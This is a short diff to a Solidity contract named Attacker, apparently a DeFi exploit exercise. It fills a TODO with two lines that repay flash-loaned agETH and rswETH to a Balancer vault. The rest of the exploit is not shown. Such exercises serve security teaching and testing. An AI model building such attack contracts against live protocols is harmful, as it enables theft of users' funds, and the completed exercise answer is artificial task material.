@@ -385,6 +385,8 @@ contract Attacker is ERC20 {
         // Return flashloaned tokens agETH and rswETH to balancerVault
         // Hint: rememeber we used saved_bal1, saved_bal2 to save the flash loaned amounts
         // TODO YOUR CODE HERE: Return flash loaned tokens to balancerVault, IERC20(??).transfer(....)
+        IERC20(agETH).transfer(balancerVault, saved_bal1);
+        IERC20(rswETH).transfer(balancerVault, saved_bal2);
     }
 }
 
